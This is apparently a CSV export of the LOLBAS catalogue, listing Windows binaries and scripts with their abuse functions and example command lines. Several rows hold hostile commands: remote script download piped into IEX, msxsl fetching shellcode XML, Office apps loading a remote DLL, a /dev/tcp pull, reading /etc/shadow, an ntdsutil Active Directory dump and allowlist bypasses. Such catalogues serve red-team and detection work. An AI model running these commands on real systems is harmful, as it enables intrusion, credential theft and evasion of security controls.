Name,BInary_Link,Function,Code(s)
Devtoolslauncher.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Devtoolslauncher/,[['Execute']],"['devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] ""argument here"" test', 'devtoolslauncher.exe LaunchForDebug [PATH_TO_BIN] ""argument here"" test']"
dnx.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dnx/,[['Execute']],['dnx.exe consoleapp']
Dotnet.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dotnet/,"[['AWL bypass', 'Execute']]","['dotnet.exe [PATH_TO_DLL]', 'dotnet.exe [PATH_TO_DLL]']"
Dxcap.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Dxcap/,[['Execute']],['Dxcap.exe -c C:\\Windows\\System32\\notepad.exe']
Excel.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Excel/,[['Download']],['Excel.exe http://192.168.1.10/TeamsAddinLoader.dll']
Mftrace.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Mftrace/,[['Execute']],"['Mftrace.exe cmd.exe', 'Mftrace.exe powershell.exe']"
Msdeploy.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msdeploy/,"[['Execute', 'AWL bypass']]","['msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""', 'msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=""c:\\temp\\calc.bat""']"
msxsl.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Msxsl/,"[['Execute', 'AWL bypass']]","['msxsl.exe customers.xml script.xsl', 'msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml', 'msxsl.exe customers.xml script.xsl', 'msxls.exe https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml https://raw.githubusercontent.com/3gstudent/Use-msxsl-to-bypass-AppLocker/master/shellcode.xml']"
ntdsutil.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Ntdsutil/,[['Dump']],"['ntdsutil.exe ""ac i ntds"" ""ifm"" ""create full c:\\"" q q']"
Powerpnt.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Powerpnt/,[['Download']],"['Powerpnt.exe ""http://192.168.1.10/TeamsAddinLoader.dll""']"
rcsi.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Rcsi/,"[['Execute', 'AWL bypass']]","['rcsi.exe bypass.csx', 'rcsi.exe bypass.csx']"
Sqldumper.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqldumper/,[['Dump']],"['sqldumper.exe 464 0 0x0110', 'sqldumper.exe 540 0 0x01100:40']"
Sqlps.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqlps/,[['Execute']],['Sqlps.exe -noprofile']
SQLToolsPS.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Sqltoolsps/,[['Execute']],['SQLToolsPS.exe -noprofile -command Start-Process calc.exe']
Squirrel.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Squirrel/,"[['Download', 'AWL bypass', 'Execute']]","['squirrel.exe --download [url to package]', 'squirrel.exe --update [url to package]', 'squirrel.exe --updateRoolback=[url to package]', 'squirrel.exe --update [url to package]', 'squirrel.exe --updateRollback=[url to package]']"
te.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Te/,[['Execute']],['te.exe bypass.wsc']
Tracker.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Tracker/,"[['Execute', 'AWL bypass']]","['Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe', 'Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe']"
Update.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Update/,"[['Download', 'AWL bypass', 'Execute']]","['Update.exe --download [url to package]', 'Update.exe --update=[url to package]', 'Update.exe --update=\\\\remoteserver\\payloadFolder', 'Update.exe --updateRollback=[url to package]', 'Update.exe --processStart payload.exe --process-start-args ""whatever args""', 'Update.exe --updateRollback=\\\\remoteserver\\payloadFolder', 'Update.exe --update=[url to package]', 'Update.exe --update=\\\\remoteserver\\payloadFolder', 'Update.exe --updateRollback=[url to package]', 'Update.exe --updateRollback=\\\\remoteserver\\payloadFolder', 'Update.exe --processStart payload.exe --process-start-args ""whatever args""']"
vsjitdebugger.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Vsjitdebugger/,[['Execute']],['Vsjitdebugger.exe calc.exe']
Winword.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Winword/,[['Download']],"['winword.exe ""http://192.168.1.10/TeamsAddinLoader.dll""']"
Wsl.exe,https://lolbas-project.github.io/lolbas/OtherMSBinaries/Wsl/,"[['Execute', 'Download']]","['wsl.exe -e /mnt/c/Windows/System32/calc.exe', 'wsl.exe -u root -e cat /etc/shadow', ""wsl.exe --exec bash -c 'cat file'"", ""wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary'""]"
CL_Mutexverifiers.ps1,https://lolbas-project.github.io/lolbas/Scripts/CL_mutexverifiers/,[['Execute']],['. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess calc.ps1']
CL_Invocation.ps1,https://lolbas-project.github.io/lolbas/Scripts/Cl_invocation/,[['Execute']],['. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1   \\nSyncInvoke  [args]']
Manage-bde.wsf,https://lolbas-project.github.io/lolbas/Scripts/Manage-bde/,[['Execute']],"['set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf', 'copy c:\\users\\person\\evil.exe c:\\users\\public\\manage-bde.exe & cd c:\\users\\public\\ & cscript.exe c:\\windows\\system32\\manage-bde.wsf']"
Pubprn.vbs,https://lolbas-project.github.io/lolbas/Scripts/Pubprn/,[['Execute']],['pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct']
Slmgr.vbs,https://lolbas-project.github.io/lolbas/Scripts/Slmgr/,[['Execute']],['reg.exe import c:\\path\\to\\Slmgr.reg & cscript.exe /b c:\\windows\\system32\\slmgr.vbs']
Syncappvpublishingserver.vbs,https://lolbas-project.github.io/lolbas/Scripts/Syncappvpublishingserver/,[['Execute']],"['SyncAppvPublishingServer.vbs ""n;((New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX""']"
winrm.vbs,https://lolbas-project.github.io/lolbas/Scripts/Winrm/,"[['Execute', 'AWL bypass']]","['winrm invoke Create wmicimv2/Win32_Process @{CommandLine=""notepad.exe""} -r:http://target:5985', 'winrm invoke Create wmicimv2/Win32_Service @{Name=""Evil"";DisplayName=""Evil"";PathName=""cmd.exe /k c:\\windows\\system32\\notepad.exe""} -r:http://acmedc:5985   \\nwinrm invoke StartService wmicimv2/Win32_Service?Name=Evil -r:http://acmedc:5985', '%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty']"
Pester.bat,https://lolbas-project.github.io/lolbas/Scripts/pester/,[['Execute']],"['Pester.bat [/help|?|-?|/?] ""$null; notepad""']"
